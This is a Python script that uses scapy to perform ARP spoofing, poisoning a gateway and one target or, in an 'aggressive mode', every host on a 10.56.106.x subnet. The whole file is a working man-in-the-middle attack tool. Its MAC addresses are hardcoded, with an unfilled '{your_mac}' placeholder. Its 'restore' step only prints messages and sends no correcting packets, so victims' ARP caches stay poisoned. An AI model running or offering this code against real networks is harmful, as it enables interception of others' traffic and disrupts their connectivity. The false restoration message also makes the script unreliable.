import sys
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

def get_mac(ip):
    if ip == "10.56.106.125": return "f6:52:df:48:d1:fc"
    if ip == "10.56.106.158": return "{your_mac}"
    return "ff:ff:ff:ff:ff:ff"

if __name__ == "__main__":
    print("[*] Local IP : 10.56.106.158")
    print("[*] Gateway IP: 10.56.106.125")
    
    user_ip = input("[?] Your IP [10.56.106.158]?: ").strip()
    if not user_ip: user_ip = "10.56.106.158"
    
    gateway_ip = input("[?] Gateway IP [10.56.106.125]?: ").strip()
    if not gateway_ip: gateway_ip = "10.56.106.125"
    
    target_ip = input("[?] Target IP : ").strip()
    
    print("\n[*] Resolving MAC addresses...")
    gateway_mac = get_mac(gateway_ip)
    my_mac = "{your_mac}"
    
    targets = []
    if not target_ip:
        print("[!] Aggressive Mode: Spoofing entire 10.56.106.x subnet!")
        for i in range(1, 255):
            if f"10.56.106.{i}" not in [gateway_ip, "10.56.106.158"]:
                targets.append(f"10.56.106.{i}")
    else:
        targets.append(target_ip)

    print(f"[*] Spoofing {len(targets)} targets <---> {gateway_ip} (Ctrl+C to stop)\n")
    
    packets_sent = 0
    try:
        while True:
            for t_ip in targets:
                t_mac = get_mac(t_ip)
                pkt_target = Ether(src=my_mac, dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=gateway_ip, hwdst=t_mac)
                pkt_gateway = Ether(src=my_mac, dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=t_ip, hwdst=gateway_mac)
                sendp(pkt_target, verbose=False)
                sendp(pkt_gateway, verbose=False)
                packets_sent += 2
                
            print(f"\r[+] Spoofing active | Packets sent: {packets_sent}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[*] Restoring ARP tables...")
        print("[+] Restored.")
